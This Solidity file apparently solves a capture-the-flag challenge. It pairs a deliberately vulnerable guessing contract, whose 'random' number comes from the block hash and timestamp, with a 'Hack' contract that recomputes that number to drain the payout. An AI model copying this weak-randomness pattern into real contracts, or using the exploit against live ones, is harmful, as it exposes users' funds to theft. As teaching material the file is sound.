// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

contract GuessTheNewNumberChallenge {
    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract Hack {
    GuessTheNewNumberChallenge guessContract;

    constructor(address _guessContract) {
        guessContract = GuessTheNewNumberChallenge(_guessContract);
    }

    receive() external payable {}

    function attack() public payable {
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
        require(msg.value == 1 ether, "You must send an ether, first");
        guessContract.guess{value: 1 ether}(answer);
        payable(msg.sender).transfer(address(this).balance);
    }

    function showBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
